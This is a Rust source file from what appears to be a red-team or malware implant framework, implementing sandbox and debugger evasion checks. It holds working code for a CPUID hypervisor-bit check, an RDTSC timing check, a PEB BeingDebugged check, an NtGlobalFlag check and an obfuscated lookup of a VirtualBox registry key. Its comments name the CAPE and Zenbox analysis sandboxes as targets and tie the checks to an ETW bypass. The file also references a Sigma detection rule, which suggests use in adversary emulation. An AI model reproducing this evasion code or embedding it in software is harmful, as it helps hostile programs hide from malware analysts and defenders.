//! Sandbox detection: CPUID hypervisor bit, RDTSC timing delta, VirtualBox registry.
//!
//! Limitation: CAPE v2 uses KVM with TSC offset patching to defeat RDTSC timing.
//! CPUID hypervisor bit can be cleared by hardened hypervisors.
//! VMMDevHelper registry key is VirtualBox-specific; CAPE/Zenbox use KVM/QEMU.
//! Treat as a first-pass filter against basic sandboxes, not production hardened sandboxes.
//!
//! Detection: see detection/sigma/evasion_sandbox_evasion.yml.

/// Returns true if any sandbox indicator is detected.
///
/// CPU checks use inline asm only (zero Windows API surface).
/// Registry check uses winreg (generates file I/O — call after etw::bypass()).
#[allow(dead_code)]
pub fn is_sandbox() -> bool {
    is_hypervisor_cpuid()
        || is_timing_anomalous()
        || is_virtualbox_registry()
        || is_being_debugged()
        || is_ntglobalflag_set()
}

/// CPUID EAX=1: ECX bit 31 is the "Hypervisor Present Bit".
/// Returns true if executing inside a hypervisor.
/// Note: modern hypervisors can clear this bit — not reliable against hardened sandboxes.
pub(super) fn is_hypervisor_cpuid() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let ecx: u32;
        unsafe {
            core::arch::asm!(
                // rbx is reserved by LLVM for PIC; save/restore it manually.
                "push rbx",
                "cpuid",
                "pop rbx",
                inout("eax") 1u32 => _,
                inout("ecx") 0u32 => ecx,
                out("edx") _,
                options(nomem),  // nostack omitted: push rbx writes to stack
            );
        }
        (ecx >> 31) & 1 == 1
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// RDTSC timing delta across a CPUID instruction.
/// On bare metal, CPUID EAX=0 costs ~50-200 cycles.
/// In most VMs, the VM-exit overhead pushes this above 750 cycles.
/// Returns true if timing suggests virtualization.
pub(super) fn is_timing_anomalous() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let tsc1 = rdtsc();
        // CPUID with EAX=0 causes a VM-exit in most hypervisors.
        unsafe {
            core::arch::asm!(
                // rbx is reserved by LLVM for PIC; save/restore it manually.
                "push rbx",
                "cpuid",
                "pop rbx",
                inout("eax") 0u32 => _,
                out("ecx") _,
                out("edx") _,
                options(nomem),  // nostack omitted: push rbx writes to stack
            );
        }
        let tsc2 = rdtsc();
        tsc2.saturating_sub(tsc1) > 750
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// PEB.BeingDebugged at gs:[0x60]+0x02.
/// Set by Windows when a user-mode debugger is attached at process creation
/// or via DebugActiveProcess(). Not set by kernel debuggers.
pub(super) fn is_being_debugged() -> bool {
    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
    unsafe {
        let peb: *const u8;
        core::arch::asm!(
            "mov {}, qword ptr gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags),
        );
        *peb.add(0x02) != 0
    }
    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
    { false }
}

/// PEB.NtGlobalFlag at gs:[0x60]+0xBC (x86_64 offset — NOT 0x68 which is x86).
/// Under a user-mode debugger, Windows sets 0x70:
///   FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20)
///   | FLG_HEAP_VALIDATE_PARAMETERS (0x40).
pub(super) fn is_ntglobalflag_set() -> bool {
    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
    unsafe {
        let peb: *const u8;
        core::arch::asm!(
            "mov {}, qword ptr gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags),
        );
        let flags = *(peb.add(0xBC) as *const u32);
        (flags & 0x70) != 0
    }
    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
    { false }
}

/// Check for VirtualBox Guest Additions registry key.
/// Only relevant on VirtualBox — CAPE/Zenbox use KVM/QEMU (this key won't exist).
pub(super) fn is_virtualbox_registry() -> bool {
    #[cfg(target_os = "windows")]
    {
        use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
        RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(obfstr::obfstr!(r"SOFTWARE\Oracle\VirtualBox Guest Additions"))
            .is_ok()
    }
    #[cfg(not(target_os = "windows"))]
    {
        false
    }
}

#[cfg(target_arch = "x86_64")]
fn rdtsc() -> u64 {
    let lo: u32;
    let hi: u32;
    unsafe {
        core::arch::asm!(
            "rdtsc",
            out("eax") lo,
            out("edx") hi,
            options(nostack, nomem, preserves_flags),
        );
    }
    ((hi as u64) << 32) | lo as u64
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_sandbox_returns_bool() {
        // On the Linux build host, all checks return false (non-Windows, non-x86_64 checks
        // return false by cfg; is_virtualbox_registry cfg(target_os=windows) returns false).
        // Function must compile and return a bool without panicking.
        let _ = is_sandbox();
    }

    #[test]
    fn hypervisor_check_returns_bool() {
        let _ = is_hypervisor_cpuid();
    }

    #[test]
    fn timing_check_returns_bool() {
        let _ = is_timing_anomalous();
    }

    #[test]
    #[cfg(target_arch = "x86_64")]
    fn rdtsc_monotone() {
        let t1 = rdtsc();
        let t2 = rdtsc();
        // TSC must be non-decreasing between two consecutive reads.
        assert!(t2 >= t1);
    }

    #[test]
    fn being_debugged_returns_bool() { let _ = is_being_debugged(); }

    #[test]
    fn ntglobalflag_returns_bool() { let _ = is_ntglobalflag_set(); }

    #[test]
    #[cfg(target_arch = "x86_64")]
    fn ntglobalflag_offset_is_x64_not_x86() {
        // x86 offset is 0x68. x86_64 offset is 0xBC. Must not be confused.
        const X64_OFFSET: usize = 0xBC;
        const X86_OFFSET: usize = 0x68;
        assert_ne!(X64_OFFSET, X86_OFFSET);
    }
}
